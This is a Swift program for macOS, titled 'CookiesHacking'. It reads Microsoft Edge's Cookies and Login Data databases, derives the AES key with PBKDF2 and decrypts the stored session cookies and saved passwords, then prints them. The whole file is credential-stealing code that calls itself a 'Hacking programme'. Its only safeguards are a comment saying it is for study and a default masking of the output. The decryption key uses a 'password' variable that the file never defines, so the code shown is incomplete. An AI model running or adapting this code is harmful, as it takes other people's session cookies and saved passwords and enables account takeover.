//
//  main.swift
//  CookiesHacking
//
//  Created by LiYanan2004 on 2022/12/4.
//

import Foundation
import SQLite
import CryptoSwift
import CommonCrypto

let browserName = "Microsoft Edge"

/// Generate key chain from the password.
/// - parameters:
///     - password: password to encrypted
func pbkdf2(password: String, saltData: Data, keyByteCount: Int, prf: CCPseudoRandomAlgorithm, rounds: Int) -> Data? {
    guard let passwordData = password.data(using: .utf8) else { return nil }
    var derivedKeyData = Data(repeating: 0, count: keyByteCount)
    let derivedCount = derivedKeyData.count
    let derivationStatus: Int32 = derivedKeyData.withUnsafeMutableBytes { derivedKeyBytes in
        let keyBuffer: UnsafeMutablePointer<UInt8> =
            derivedKeyBytes.baseAddress!.assumingMemoryBound(to: UInt8.self)
        return saltData.withUnsafeBytes { saltBytes -> Int32 in
            let saltBuffer: UnsafePointer<UInt8> = saltBytes.baseAddress!.assumingMemoryBound(to: UInt8.self)
            return CCKeyDerivationPBKDF(
                CCPBKDFAlgorithm(kCCPBKDF2),
                password,
                passwordData.count,
                saltBuffer,
                saltData.count,
                prf,
                UInt32(rounds),
                keyBuffer,
                derivedCount)
        }
    }
    return derivationStatus == kCCSuccess ? derivedKeyData : nil
}

/// Decrypt text from encrypted data.
func decrypt(from encryptedData: Data) -> String? {
    var encrypted: [UInt8] = []
    let count = encryptedData.count
    
    for i in min(count, 3) ..< count {
        encrypted.append(encryptedData.bytes[i])
    }
    
    var decrypted: [UInt8] = []
    let key = pbkdf2(password: password, saltData: "saltysalt".data(using: .utf8)!, keyByteCount: 16, prf: CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA1), rounds: 1003)!
    let iv = "                ".bytes // 16 spaces
    
    do {
        decrypted = try AES(key: key.bytes, blockMode: CBC(iv: iv)).decrypt(encrypted)
    } catch {
        print("Fail")
    }
    return String(bytes: Data(decrypted), encoding: .utf8)
}

/// Fetch cookies from Microsoft Edge.
/// - parameters:
///     - hideContent: If `false`, all text will be printed, otherwise, middle part of the content will be replaced with '*'
/// - warning: This should be used legally. Here is just for study, dont use it on the internet to hack others' data.
func fetchCookies(hideContent: Bool = false) {
    do {
        let db = try Connection("\(NSHomeDirectory())/Library/Application Support/\(browserName)/Default/Cookies")
        
        let cookies = Table("cookies")
        let hostKey = Expression<String>("host_key")
        let name = Expression<String>("name")
        let encryptedValue = Expression<Data?>("encrypted_value")

        for cookie in try db.prepare(cookies) {
            if let encryptedData = cookie[encryptedValue] {
                let prefixBytes = encryptedData.bytes.prefix(3)
                let header = String(bytes: Data(prefixBytes), encoding: .utf8)

                guard header == "v10" || header == "v11" else { continue }
                guard let cookieValue = decrypt(from: encryptedData) else { continue }
                
                let cookieHeader = cookieValue.prefix(8)
                let cookieTail = String(cookieValue.reversed().prefix(8).reversed())
                print("host: \(cookie[hostKey])\n\tname: \(cookie[name])\n\tvalue: \(hideContent ? "\(cookieHeader)...\(cookieTail)" : cookieValue)")
            }
        }
    } catch {
        print(error.localizedDescription)
    }
}

/// Fetch login data (saved user names and passwords)  from Microsoft Edge.
/// - parameters:
///     - hideContent: If `false`, all text will be printed, otherwise, middle part of the content will be replaced with '*'
/// - warning: This should be used legally. Here is just for study, dont use it on the internet to hack others' data.
func fetchLoginData(hideContent: Bool = false) {
    do {
        let db = try Connection("\(NSHomeDirectory())/Library/Application Support/\(browserName)/Default/Login Data")
    
        let logins = Table("logins")
        let userName = Expression<String>("username_value")
        let encryptedValue = Expression<Data?>("password_value")

        for login in try db.prepare(logins) {
            if let encryptedData = login[encryptedValue] {
                let prefixBytes = encryptedData.bytes.prefix(3)
                let header = String(bytes: Data(prefixBytes), encoding: .utf8)

                guard header == "v10" || header == "v11" else { continue }
                guard let password = decrypt(from: encryptedData) else { continue }
                
                let passwordHeader = password.prefix(2)
                let passwordTail = String(password.reversed().prefix(2).reversed())
                print("userName: \(hideContent ? String(login[userName].prefix(3)) : login[userName])\(hideContent ? "..." : "")\n\tpassword: \(hideContent ? "\(passwordHeader)...\(passwordTail)" : password)")
            }
        }
    } catch {
        print(error.localizedDescription)
    }
}

print("Hacking programme started...")
print("")

print("------------------ Cookies ------------------")
fetchCookies(hideContent: true)

print("")
print("------------------ Login Data ------------------")
fetchLoginData(hideContent: true)

print("")
print("Done.")

